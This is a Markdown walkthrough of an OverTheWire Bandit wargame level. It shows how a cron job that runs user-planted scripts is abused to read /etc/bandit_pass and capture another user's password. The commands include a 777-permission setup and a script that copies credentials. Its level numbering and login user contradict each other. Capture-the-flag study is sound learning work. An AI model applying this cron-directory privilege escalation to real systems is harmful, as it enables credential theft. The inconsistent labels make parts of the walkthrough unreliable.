# Bandit Level 22 → Level 23

---

## 🎯 Objective

A script is being run automatically via `cron`. Your goal is to:
- Discover what script is being executed
- Exploit it to run your own code
- Extract the password for `bandit24`

You’ll write your **first custom shell** script to do this.



---


## 🛠️ Commands Used (with explanations)

- `ls` - Lists files and directories in the current location.
  - `-l` - Lists files with detailed permissions, ownership, and size information.
- `cat` - Displays the contents of a file.
- `nano` - A simple text editor used to write and edit files.
- `touch` - Creates an empty file or updates the timestamp of an existing one.
- `mktemp`- Creates a new temporary file with a unique name
  - `-d` - Creates a new temporary directory with a unique name.
- `cd` - Changes the current working directory.
- `chmod` - Changes file or directory permissions.
  - `777` - Grants read, write, and execute permissions to everyone (user, group, others).
- `cp` - Copies files or directories.
  
---

## 🚀 Steps to Solve
1. **Open your terminal**

2. **Run the following command to log into the server**:

```bash
ssh bandit20@bandit.labs.overthewire.org -p 2220
```

3. **Enter the password**

4. **Look inside `/etc/cron.d/` for cron job**:
```bash
ls /etc/cron.d/
```
  - You should see:
```bash
clean_tmp  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  e2scrub_all  otw-tmp-dir  sysstat
```

5. **Read the contents of the cron job**:
```bash
cat /etc/cron.d/cronjob_bandit24
```
  - You should see:
    ```bash
    @reboot bandit24 /usr/bin/cronjob_bandit24.sh  &> /dev/null
    * * * * * bandit24 /usr/bin/cronjob_bandit24.sh  &> /dev/null
    ```
    
6. **Read the script that is being run**:
```bash
cat /usr/bin/cronjob_bandit24.sh
```
  - You should see:
       ```bash
       #!/bin/bash
       
       myname=$(whoami)
       
       cd /var/spool/$myname/foo
       echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
       for i in * .*;
       do
         if [ "$i" != "." -a "$i" != ".." ];
         then
           echo "Handling $i"
           owner="$(stat --format "%U" ./$i)"
            if [ "${owner}" = "bandit23" ]; then
                timeout -s 9 60 ./$i
            fi
            rm -f ./$i
        fi
      done
       ```
       - The scheduled task is executing scripts inside `/var/spool/$myname/foo`, deleting them after execution 
       - `$myname` = `bandit24` - since its executed inside `bandit24's` space
       - Therefore, our script needs to go into `/var/spool/bandit24/foo`
   
         
7. **Create a `tmp` directory to work in**:
```bash
mktemp -d
```
  - You should see:
    ```bash
    /tmp/tmp.<tmp_directory>
    ```
    
8. **Move into `/tmp/tmp.<tmp_directory>`**:
```bash
cd /tmp/tmp.<tmp_directory>
```

9. **Create a script**:
```bash
touch tmp.sh
 ```

10. **Open, edit, and save the script**:
```bash
nano tmp.sh
 ```
  - I prefer nano, but options like vim also work
  - Add the following script:
    ```bash
    myname=$(whoami)

    cat /etc/bandit_pass/$myname > /tmp/tmp.<tmp_directory>/password
    ```
      - This script is from the `bandit22` level
      - We are saving the `bandit24` password to a file, called password, in `<tmp_directory>`
        
11. **Create the password file**:
```bash
nano password
 ```

12. **Set permissions**:
```bash
chmod 777 <tmp_directory>
chmod 777 tmp.sh
chmod 777 password
 ```
- `chmod 777 tmp.sh` - Makes the script executable by all users, including `bandit24`, so the cron job can run it.
- `chmod 777 password` - Makes the output file writable by `bandit24`, so the script can write the password to it
- `chmod 777 <tmp_directory>` - Ensures the directory is accessible (read/write/execute) by `bandit24`:
    - Read to list files
    - Write to create or modify files
    - Execute to enter/access the directory - without this permissions, the `password` cannot be accessed
        
13. **Check permissions**:
```bash
ls -l
 ```
- You should see:
  ```bash
  -rwxrwxrwx 1 bandit23 bandit23 33 Jun  8 17:27 password
  -rwxrwxrwx 1 bandit23 bandit23 78 Jun  8 17:14 tmp.sh
  ```
  
   
14. **Copy the script into `/var/spool/bandit24/foo/`**:
```bash
cp tmp.sh /var/spool/bandit24/foo/
```
- Wait 1-2 minutes for the cron job to run

15. **Display the contents of `password`**:
```bash
cat password
 ```

Thats the password for `bandit24`

---

## 🎉 You’ve now completed Level 23 → Level 24!


---

## 🧠 Lessons Learned / Notes
- This level teaches **privilege escalation through writable cron-controlled directories**.

- Writing simple bash scripts is a powerful skill.

- `/tmp` is world-writable and readable - great for sharing data between users, but a security risk in real-world systems.

- While `chmod 777` works for this challenge (since it's a CTF-style learning environment), it's generally **insecure in production systems**. It gives full read/write/execute permissions to everyone, including malicious users.
